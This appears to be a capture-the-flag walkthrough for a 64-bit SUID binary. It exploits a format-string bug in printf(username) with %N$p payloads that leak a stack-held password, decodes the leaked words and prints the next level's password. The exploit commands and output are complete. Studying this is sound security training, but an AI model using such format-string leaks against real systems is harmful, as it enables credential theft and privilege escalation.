# Level 02 - Practical walkthrough

> 🔓 **Flaw:** format-string bug - `printf(username)` with no format specifier
> 🎯 **Target:** the next password, sitting on the stack (read from `/home/users/level03/.pass`)
> 🛠️ **Technique:** leak stack words with `%N$p`, then decode them (hex → ASCII → reverse).

All commands are run as user `level02`. This binary is **64-bit** (each `%p` prints an
8-byte word).

## 1. Observe the program

🟦 **Goal:** confirm the SUID bit and the login flow.

🟨 **Terminal:**

```bash
ls -l ./level02
./level02
```

⬜ **Output:**

```text
-rwsr-s---+ 1 level03 users 9452 Sep 10  2016 level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: me!
--[ Password: mine!
*****************************************
me! does not have access!
```

Owned by `level03` and SUID. Notice the error line echoes our username (`me!`) - a strong
hint that the username is passed straight to `printf`.

## 2. Understand the program

🟦 **Goal:** locate the password in memory and confirm the format-string bug.

🟨 **Terminal:**

```bash
gdb ./level02
```

🟨 **GDB:**

```gdb
disassemble main
```

Reading `main`:

- It `fopen`s `/home/users/level03/.pass` and `fread`s 41 bytes into a **stack** buffer.
- It reads our username and password from stdin.
- It compares our password with the real one via `strncmp(..., 41)` - unbreakable directly.
- On failure it calls `printf(username)` **without a format string**. That is the way in:
  our username is interpreted as a format string, so `%p` specifiers leak stack words.

## 3. Confirm the leak

🟦 **Goal:** verify that `%p` in the username dumps the stack.

🟨 **Terminal:**

```bash
(python -c 'print("AAAA %p %p %p %p %p %p")'; echo pass; cat) | ./level02
```

⬜ **Output (excerpt):**

```text
AAAA 0x... (nil) 0x... 0x2a2a2a2a2a2a2a2a ...
```

The `0x2a2a...` words are the `*` banner; walking further along the argument list we reach
the password buffer. Direct parameter access (`%N$p`) lets us jump straight to it.

## 4. Locate and read the password

🟦 **Goal:** find which argument indices hold the password and dump them in order.

🟨 **Terminal:**

```bash
(python -c 'print("%26$p%25$p%24$p%23$p%22$p")'; echo pass; cat) | ./level02
```

⬜ **Output (the username echo line):**

```text
0x48336750664b394d0x354a35686e4758730x377a7143574e67580x45414a35617339510x756e505234376848 does not have access!
```

Arguments **22-26** hold the password. We print them from 26 down to 22 so the words line up
in the right order.

🟦 **Goal:** decode the leaked words. Each 8-byte word is stored little-endian, so we convert
hex → raw bytes and reverse.

🟨 **Terminal:**

```bash
echo 0x48336750664b394d0x354a35686e4758730x377a7143574e67580x45414a35617339510x756e505234376848 | xxd -r -p | rev
```

⬜ **Output:**

```text
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

That is `level03`'s password.

## 5. Move to the next level

🟨 **Terminal:**

```bash
su level03
```

🟨 **At the `su` prompt** type only the value (`Password:` is printed by `su`):

- `Password:` → `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`

🟨 **In the shell:**

```bash
whoami
```

⬜ **Output:**

```text
level03
```

> Note: we could also log in through the program itself - once we know the password, typing
> it as both prompts reaches `system("/bin/sh")` with `level03`'s rights. Reading `.pass`
> after `su` is simply the cleanest proof.
